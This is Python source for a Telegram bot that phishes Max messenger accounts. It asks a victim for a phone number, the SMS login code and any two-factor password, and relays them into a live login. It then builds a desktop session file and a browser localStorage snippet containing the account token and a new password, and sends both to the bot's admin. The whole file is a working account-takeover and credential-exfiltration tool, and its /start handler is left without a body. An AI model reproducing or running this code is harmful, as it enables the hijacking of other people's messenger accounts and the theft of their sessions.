class AuthState(StatesGroup):
    waiting_for_code = State()
    waiting_for_password = State()

# Глобальная очередь для передачи кода из Telegram в pymax
code_queue = {}
password_queue = {}

def gen_password():
    import random, string
    return ''.join(random.choices(string.ascii_letters + string.digits + "_@#", k=40))

def build_desktop_json(token, device_id, session_id, password, user_id, phone):
    return {
        "token": token,
        "device_id": device_id,
        "session_id": session_id,
        "password": password,
        "connection_params": {
            "device_type": "DESKTOP",
            "header_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
            "app_version": "25.12.13",
            "device_name": "Chrome",
            "os_version": "Windows 10",
            "locale": "ru",
            "device_locale": "ru",
            "screen": "1080x1920",
            "timezone": "Europe/Moscow"
        },
        "user": {
            "user_id": user_id,
            "phone": int(phone.replace("+", "")),
            "photo_id": None,
            "first_name": "",
            "last_name": ""
        }
    }

def generate_web_js(password, device_id, token, viewer_id):
    return f"""PASSWORD: {password}

sessionStorage.clear();
localStorage.clear();
localStorage.setItem('__oneme_device_id', '{device_id}');
localStorage.setItem('__oneme_auth', JSON.stringify({{"token":"{token}","viewerId":{viewer_id}}}));
window.location.reload();"""

async def send_files(phone, uid, work_dir, desktop, js):
    dp = f"{work_dir}/desktop_session.json"
    with open(dp, "w") as f: json.dump(desktop, f, indent=4)
    wp = f"{work_dir}/web_token.js"
    with open(wp, "w") as f: f.write(js)
    await bot.send_document(ADMIN_ID, FSInputFile(dp), caption=f"💻 Десктоп\n{phone}")
    await bot.send_document(ADMIN_ID, FSInputFile(wp), caption=f"🌐 Веб\n{phone}")

@dp.message(F.text == "/start")
async def start(message: types.Message):

@dp.message(F.text.regexp(r'^\+7\d{10}$'))
async def phone_handler(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    uid = message.from_user.id
    work_dir = f"cache/{uid}"
    os.makedirs(work_dir, exist_ok=True)
    
    # Создаём клиент
    client = SocketMaxClient(phone=phone, work_dir=work_dir)
    
    # Сохраняем в состоянии
    await state.set_state(AuthState.waiting_for_code)
    await state.update_data(phone=phone, work_dir=work_dir, uid=uid)
    
    # Запускаем авторизацию в отдельном потоке
    def run_auth():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(auth_flow(uid, client, message, state))
    
    threading.Thread(target=run_auth, daemon=True).start()
    await message.answer("📩 Запрашиваю SMS...")

async def auth_flow(uid, client, message, state):
    try:
        # Патчим встроенный input()
        import builtins
        original_input = builtins.input
        builtins.input = lambda prompt="": patch_input(uid, prompt)
        
        await client.start()
        
        # Если авторизация прошла успешно
        data = await state.get_data()
        phone = data["phone"]
        work_dir = data["work_dir"]
        
        token = client.token
        viewer_id = client.my_id
        password = gen_password()
        session_id = int(time.time() * 1000)
        device_id = str(uuid.uuid4())
        
        desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
        js = generate_web_js(password, device_id, token, viewer_id)
        
        await send_files(phone, uid, work_dir, desktop, js)
        await message.answer("✅ Готово! Файлы отправлены админу.")
        
        builtins.input = original_input
        
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

def patch_input(uid, prompt):
    """Перехватывает input() и ждёт код из Telegram"""
    import builtins
    
    if "code" in prompt.lower() or "код" in prompt.lower():
        # Ждём код из очереди
        while uid not in code_queue or code_queue[uid] is None:
            time.sleep(0.5)
        code = code_queue.pop(uid)
        return code
    
    elif "password" in prompt.lower() or "пароль" in prompt.lower():
        while uid not in password_queue or password_queue[uid] is None:
            time.sleep(0.5)
        pwd = password_queue.pop(uid)
        return pwd
    
    # На всякий случай
    return builtins.input(prompt)

@dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
async def code_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    code = message.text.strip()
    code_queue[uid] = code
    await message.answer("⏳ Проверяю код...")

@dp.message(AuthState.waiting_for_password)
async def password_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    pwd = message.text.strip()
    password_queue[uid] = pwd
    await message.answer("⏳ Проверяю пароль...")
